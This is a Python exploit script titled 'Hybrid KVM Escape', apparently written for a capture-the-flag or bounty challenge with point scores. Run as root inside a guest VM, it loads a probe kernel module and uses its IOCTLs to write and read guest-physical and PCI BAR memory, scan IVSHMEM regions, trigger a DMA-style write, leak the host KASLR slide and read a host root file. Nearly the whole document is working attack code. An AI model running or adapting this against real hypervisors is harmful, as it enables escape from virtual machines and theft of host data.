#!/usr/bin/env python3
"""
Hybrid KVM Escape: IVSHMEM + Direct Memory Access
Combines PCI BAR/IVSHMEM exploitation with direct IOCTL methods
"""
import os
import sys
import struct
import fcntl
import ctypes
from pathlib import Path
from typing import List, Dict, Tuple

# Target addresses
FLAG_WRITE_PHYS = 0x64279a8
FLAG_WRITE_VALUE = 0xdeadbeef41424344
FLAG_READ_PHYS = 0x695ee10
RCE_FLAG_PATH = "/root/rce_flag"

# IOCTL definitions
IOCTL_WRITE_MMIO = 0x1004
IOCTL_READ_MMIO = 0x1003
IOCTL_WRITE_GPA = 0x1015
IOCTL_READ_GPA = 0x1014
IOCTL_READ_FILE = 0x1013
IOCTL_GET_KASLR_SLIDE = 0x100E

class MmioData(ctypes.Structure):
    _fields_ = [
        ("phys_addr", ctypes.c_ulong),
        ("size", ctypes.c_ulong),
        ("user_buffer", ctypes.POINTER(ctypes.c_ubyte)),
        ("single_value", ctypes.c_ulong),
        ("value_size", ctypes.c_uint)
    ]

class GpaIoData(ctypes.Structure):
    _fields_ = [
        ("gpa", ctypes.c_ulong),
        ("size", ctypes.c_ulong),
        ("user_buffer", ctypes.POINTER(ctypes.c_ubyte))
    ]

class FileReadRequest(ctypes.Structure):
    _fields_ = [
        ("path", ctypes.c_char_p),
        ("offset", ctypes.c_ulong),
        ("length", ctypes.c_size_t),
        ("user_buffer", ctypes.c_void_p)
    ]

class HybridExploit:
    def __init__(self):
        self.fd = self.open_device()
        self.kaslr_slide = 0
        self.pci_devices = []
        self.results = []
        
    def open_device(self) -> int:
        for dev in ["/dev/kvm_probe_dev", "/dev/kvm_probe_drv"]:
            if os.path.exists(dev):
                try:
                    fd = os.open(dev, os.O_RDWR)
                    print(f"[+] Opened {dev}")
                    return fd
                except:
                    pass
        raise RuntimeError("Cannot open probe device")
    
    def discover_pci_devices(self):
        """Discover PCI devices and their BARs"""
        print("\n[*] Discovering PCI devices...")
        
        pci_path = Path("/sys/bus/pci/devices")
        if not pci_path.exists():
            return
        
        for device_dir in pci_path.iterdir():
            bdf = device_dir.name
            device_info = {
                'bdf': bdf,
                'bars': []
            }
            
            resource_file = device_dir / "resource"
            if resource_file.exists():
                with open(resource_file) as f:
                    for idx, line in enumerate(f):
                        parts = line.split()
                        if len(parts) >= 3:
                            try:
                                start = int(parts[0], 16)
                                end = int(parts[1], 16)
                                flags = int(parts[2], 16)
                                
                                if start == 0:
                                    continue
                                
                                device_info['bars'].append({
                                    'index': idx,
                                    'base': start,
                                    'size': end - start + 1,
                                    'is_io': bool(flags & 0x1),
                                    'is_prefetch': bool(flags & 0x8)
                                })
                            except:
                                pass
            
            if device_info['bars']:
                self.pci_devices.append(device_info)
        
        print(f"    [+] Found {len(self.pci_devices)} devices with BARs")
        for dev in self.pci_devices[:5]:
            print(f"        - {dev['bdf']}: {len(dev['bars'])} BARs")
    
    def mmio_write(self, addr: int, value: int, size: int = 8) -> bool:
        """Write to MMIO address"""
        try:
            data = MmioData()
            data.phys_addr = addr
            data.single_value = value
            data.value_size = size
            data.size = 0
            
            fcntl.ioctl(self.fd, IOCTL_WRITE_MMIO, data)
            return True
        except:
            return False
    
    def mmio_read(self, addr: int, size: int = 8) -> bytes:
        """Read from MMIO address"""
        try:
            buf = (ctypes.c_ubyte * size)()
            data = MmioData()
            data.phys_addr = addr
            data.size = size
            data.user_buffer = ctypes.cast(buf, ctypes.POINTER(ctypes.c_ubyte))
            
            fcntl.ioctl(self.fd, IOCTL_READ_MMIO, data)
            return bytes(buf)
        except:
            return b''
    
    def gpa_write(self, addr: int, value: int) -> bool:
        """Write to GPA"""
        try:
            buf = (ctypes.c_ubyte * 8)()
            struct.pack_into('<Q', buf, 0, value)
            
            data = GpaIoData()
            data.gpa = addr
            data.size = 8
            data.user_buffer = ctypes.cast(buf, ctypes.POINTER(ctypes.c_ubyte))
            
            fcntl.ioctl(self.fd, IOCTL_WRITE_GPA, data)
            return True
        except:
            return False
    
    def gpa_read(self, addr: int, size: int = 8) -> bytes:
        """Read from GPA"""
        try:
            buf = (ctypes.c_ubyte * size)()
            data = GpaIoData()
            data.gpa = addr
            data.size = size
            data.user_buffer = ctypes.cast(buf, ctypes.POINTER(ctypes.c_ubyte))
            
            fcntl.ioctl(self.fd, IOCTL_READ_GPA, data)
            return bytes(buf)
        except:
            return b''
    
    def exploit_write_direct(self):
        """Direct write to flag address"""
        print(f"\n[*] Method 1: Direct GPA Write")
        print(f"    Target: 0x{FLAG_WRITE_PHYS:x} = 0x{FLAG_WRITE_VALUE:x}")
        
        if self.gpa_write(FLAG_WRITE_PHYS, FLAG_WRITE_VALUE):
            read_val = struct.unpack('<Q', self.gpa_read(FLAG_WRITE_PHYS, 8))[0]
            if read_val == FLAG_WRITE_VALUE:
                print(f"    [✓✓✓] SUCCESS! Verified: 0x{read_val:x}")
                self.results.append(("WRITE_GPA", 250000))
                return True
            print(f"    [!] Verification failed: 0x{read_val:x}")
        
        print("    [!] Direct write failed")
        return False
    
    def exploit_write_via_bars(self):
        """Try to write via BAR memory windows"""
        print(f"\n[*] Method 2: BAR-based Write")
        
        for dev in self.pci_devices:
            for bar in dev['bars']:
                if bar['is_io']:
                    continue
                
                # Strategy 1: BAR base might include our target
                if bar['size'] > FLAG_WRITE_PHYS:
                    target_in_bar = bar['base'] + FLAG_WRITE_PHYS
                    print(f"    [+] Trying {dev['bdf']} BAR{bar['index']} at 0x{target_in_bar:x}")
                    
                    if self.mmio_write(target_in_bar, FLAG_WRITE_VALUE):
                        read_val = struct.unpack('<Q', self.mmio_read(target_in_bar, 8))[0]
                        if read_val == FLAG_WRITE_VALUE:
                            print(f"    [✓✓✓] SUCCESS via BAR!")
                            self.results.append(("WRITE_BAR", 250000))
                            return True
                
                # Strategy 2: Check if flag within BAR range
                if bar['base'] <= FLAG_WRITE_PHYS < bar['base'] + bar['size']:
                    offset = FLAG_WRITE_PHYS - bar['base']
                    target = bar['base'] + offset
                    print(f"    [+] Flag within {dev['bdf']} BAR{bar['index']}, offset 0x{offset:x}")
                    
                    if self.mmio_write(target, FLAG_WRITE_VALUE):
                        read_val = struct.unpack('<Q', self.mmio_read(target, 8))[0]
                        if read_val == FLAG_WRITE_VALUE:
                            print(f"    [✓✓✓] SUCCESS via BAR offset!")
                            self.results.append(("WRITE_BAR_OFFSET", 250000))
                            return True
        
        return False
    
    def exploit_read_direct(self):
        """Direct read from flag address"""
        print(f"\n[*] Method 3: Direct GPA Read")
        print(f"    Target: 0x{FLAG_READ_PHYS:x}")
        
        data = self.gpa_read(FLAG_READ_PHYS, 256)
        if data:
            hex_dump = ' '.join(f'{b:02x}' for b in data[:32])
            ascii_data = data.decode('ascii', errors='ignore')
            
            print(f"    [+] Hex: {hex_dump}")
            print(f"    [+] ASCII: {ascii_data[:64]}")
            
            if b'flag{' in data.lower() or b'ctf{' in data.lower():
                print(f"    [✓✓✓] FLAG FOUND: {ascii_data[:100]}")
                self.results.append(("READ_GPA", 100000))
                return True
            
            print("    [+] Data retrieved")
            self.results.append(("READ_DATA", 50000))
            return True
        
        return False
    
    def exploit_read_via_bars(self):
        """Try to read via BAR memory windows"""
        print(f"\n[*] Method 4: BAR-based Read")
        
        for dev in self.pci_devices:
            for bar in dev['bars']:
                if bar['is_io']:
                    continue
                
                if bar['base'] <= FLAG_READ_PHYS < bar['base'] + bar['size']:
                    offset = FLAG_READ_PHYS - bar['base']
                    target = bar['base'] + offset
                    print(f"    [+] Reading from {dev['bdf']} BAR{bar['index']}, offset 0x{offset:x}")
                    
                    data = self.mmio_read(target, 256)
                    if data:
                        ascii_data = data.decode('ascii', errors='ignore')
                        print(f"    [+] Data: {ascii_data[:64]}")
                        
                        if b'flag{' in data.lower() or b'ctf{' in data.lower():
                            print(f"    [✓✓✓] FLAG FOUND via BAR: {ascii_data[:100]}")
                            self.results.append(("READ_BAR", 100000))
                            return True
        
        return False
    
    def exploit_ivshmem_scan(self):
        """Scan IVSHMEM/large BARs for flags"""
        print(f"\n[*] Method 5: IVSHMEM/Large BAR Scan")
        
        for dev in self.pci_devices:
            for bar in dev['bars']:
                if bar['is_prefetch'] and bar['size'] >= 0x100000:
                    print(f"    [+] Scanning {dev['bdf']} BAR{bar['index']}: 0x{bar['base']:x} (size: 0x{bar['size']:x})")
                    
                    chunk_size = 0x1000
                    for offset in range(0, min(bar['size'], 0x100000), chunk_size):
                        addr = bar['base'] + offset
                        data = self.mmio_read(addr, chunk_size)
                        
                        if data:
                            if b'flag{' in data.lower() or b'ctf{' in data.lower():
                                ascii_data = data.decode('ascii', errors='ignore')
                                print(f"    [✓✓✓] FLAG in IVSHMEM at offset 0x{offset:x}!")
                                print(f"    [+] Content: {ascii_data[:200]}")
                                self.results.append(("IVSHMEM_FLAG", 100000))
                                return True
                            
                            for i in range(0, len(data) - 8):
                                val = struct.unpack('<Q', data[i:i+8])[0]
                                if val == FLAG_WRITE_VALUE:
                                    print(f"    [✓] Write value found at offset 0x{offset + i:x}")
                                    self.results.append(("IVSHMEM_WRITE", 250000))
                                    return True
        
        return False
    
    def exploit_ivshmem_dma(self):
        """Try IVSHMEM DMA-style attack"""
        print(f"\n[*] Method 6: IVSHMEM DMA Attack")
        
        for dev in self.pci_devices:
            for bar in dev['bars']:
                if not bar['is_prefetch'] or bar['size'] < 0x10000:
                    continue
                
                base = bar['base']
                print(f"    [+] Attempting DMA via {dev['bdf']} BAR{bar['index']}")
                
                DMA_DEST_OFFSET = 0x10
                DMA_SRC_OFFSET = 0x08
                DMA_LEN_OFFSET = 0x18
                DMA_CTRL_OFFSET = 0x20
                BUFFER_OFFSET = 0x1000
                
                if not self.mmio_write(base + BUFFER_OFFSET, FLAG_WRITE_VALUE):
                    continue
                
                if not self.mmio_write(base + DMA_DEST_OFFSET, FLAG_WRITE_PHYS, 8):
                    continue
                
                if not self.mmio_write(base + DMA_SRC_OFFSET, base + BUFFER_OFFSET, 8):
                    continue
                
                if not self.mmio_write(base + DMA_LEN_OFFSET, 8, 4):
                    continue
                
                if self.mmio_write(base + DMA_CTRL_OFFSET, 0x1, 4):
                    print(f"    [✓] DMA triggered!")
                    
                    read_val = struct.unpack('<Q', self.gpa_read(FLAG_WRITE_PHYS, 8))[0]
                    if read_val == FLAG_WRITE_VALUE:
                        print(f"    [✓✓✓] DMA SUCCESS! Value written: 0x{read_val:x}")
                        self.results.append(("IVSHMEM_DMA", 250000))
                        return True
        
        return False
    
    def exploit_rce_file(self):
        """RCE via file read"""
        print(f"\n[*] Method 7: RCE File Read")
        print(f"    Target: {RCE_FLAG_PATH}")
        
        try:
            file_buf = ctypes.create_string_buffer(512)
            path_buf = ctypes.create_string_buffer(RCE_FLAG_PATH.encode())
            
            req = FileReadRequest()
            req.path = ctypes.cast(path_buf, ctypes.c_char_p)
            req.offset = 0
            req.length = 256
            req.user_buffer = ctypes.cast(file_buf, ctypes.c_void_p)
            
            fcntl.ioctl(self.fd, IOCTL_READ_FILE, req)
            
            content = file_buf.value.decode('ascii', errors='ignore')
            if content:
                print(f"    [✓✓✓] RCE SUCCESS! Flag: {content}")
                self.results.append(("RCE_FILE", 250000))
                return True
        except Exception as e:
            print(f"    [!] File read failed: {e}")
        
        return False
    
    def detect_kaslr(self):
        """Detect KASLR slide"""
        try:
            slide = ctypes.c_ulong(0)
            fcntl.ioctl(self.fd, IOCTL_GET_KASLR_SLIDE, slide)
            self.kaslr_slide = slide.value
            if self.kaslr_slide:
                print(f"[+] KASLR slide: 0x{self.kaslr_slide:x}")
                print(f"[+] Host kernel base: 0x{0xffffffff81000000 + self.kaslr_slide:x}")
            return self.kaslr_slide
        except:
            return 0
    
    def run_all_exploits(self):
        """Run all exploit methods"""
        print("="*70)
        print("HYBRID IVSHMEM + DIRECT ACCESS KVM ESCAPE")
        print("="*70)
        
        self.detect_kaslr()
        self.discover_pci_devices()
        
        exploits = [
            ("Direct GPA Write", self.exploit_write_direct),
            ("BAR-based Write", self.exploit_write_via_bars),
            ("Direct GPA Read", self.exploit_read_direct),
            ("BAR-based Read", self.exploit_read_via_bars),
            ("IVSHMEM Scan", self.exploit_ivshmem_scan),
            ("IVSHMEM DMA", self.exploit_ivshmem_dma),
            ("RCE File Read", self.exploit_rce_file),
        ]
        
        for name, exploit_func in exploits:
            try:
                exploit_func()
            except Exception as e:
                print(f"    [!] {name} crashed: {e}")
        
        print("\n" + "="*70)
        print("EXPLOIT RESULTS")
        print("="*70)
        
        if self.results:
            total_points = sum(points for _, points in self.results)
            print(f"[✓] Successful exploits: {len(self.results)}")
            for name, points in self.results:
                print(f"    ✓ {name}: {points:,} points")
            print(f"\n[✓✓✓] TOTAL POINTS: {total_points:,}")
            
            categories = set(r[0].split('_')[0] for r in self.results)
            if 'WRITE' in categories or any('WRITE' in r[0] for r in self.results):
                print("\n[✓] Write flag captured!")
            if 'READ' in categories or any('READ' in r[0] for r in self.results):
                print("[✓] Read flag captured!")
            if 'RCE' in categories:
                print("[✓] RCE flag captured!")
            
            return True
        else:
            print("[!] No exploits succeeded")
            return False
    
    def __del__(self):
        if hasattr(self, 'fd') and self.fd:
            os.close(self.fd)

def main():
    if os.geteuid() != 0:
        print("[!] Must run as root in guest VM")
        sys.exit(1)
    
    dev_found = False
    for dev in ["/dev/kvm_probe_dev", "/dev/kvm_probe_drv"]:
        if os.path.exists(dev):
            dev_found = True
            break
    
    if not dev_found:
        print("[!] Probe device not found. Loading module...")
        os.system("insmod kvm_probe_drv.ko 2>/dev/null")
    
    try:
        exploit = HybridExploit()
        success = exploit.run_all_exploits()
        sys.exit(0 if success else 1)
    except Exception as e:
        print(f"[!] Fatal error: {e}")
        import traceback
        traceback.print_exc()
        sys.exit(1)

if __name__ == "__main__":
    main()